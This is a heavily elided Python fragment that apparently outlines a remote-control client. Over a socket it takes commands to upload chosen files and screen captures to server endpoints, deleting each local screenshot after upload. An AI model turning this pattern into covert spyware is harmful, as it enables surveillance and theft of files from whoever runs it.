...
def process(s):
	...
	if len(data)==0:
		...
		processCommand(s, data.decode("utf-8"))
...
def download(s, command):
	...
	results = []
	for f in paths:
		results += uploadFile(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(" ".join(results))
...
def screenshot(command):
	...
	image.save(fpath)
	image.close()
	r = uploadFile(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)

def uploadFile(filePath, uploadPath, addHeaders=None):
